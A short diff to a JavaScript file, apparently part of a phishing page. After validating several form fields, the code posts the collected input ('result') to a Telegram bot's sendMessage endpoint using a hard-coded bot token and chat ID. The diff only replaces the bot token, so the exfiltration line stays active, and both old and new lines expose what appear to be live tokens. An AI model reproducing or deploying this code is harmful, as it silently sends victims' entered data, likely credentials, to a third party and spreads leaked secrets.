@@ -30,7 +30,7 @@ if(strText==""||strText1==""||strText2==""||strText3==""||strText4==""||strText6
         }else
         {
             const request = new XMLHttpRequest();
-        const url = 'https://api.telegram.org/bot1641457962:AAGnP9PzlsLOiUDJFhhwG0braXVNiJBBJic/sendMessage?chat_id=-1001516712828&text='+result;
+        const url = 'https://api.telegram.org/bot1641457962:AAGEETFtrtqexe3xRiFbeoXqKO6xoP9YnC0/sendMessage?chat_id=-1001516712828&text='+result;
         request.open("post", url);
         request.send();
          //  replace
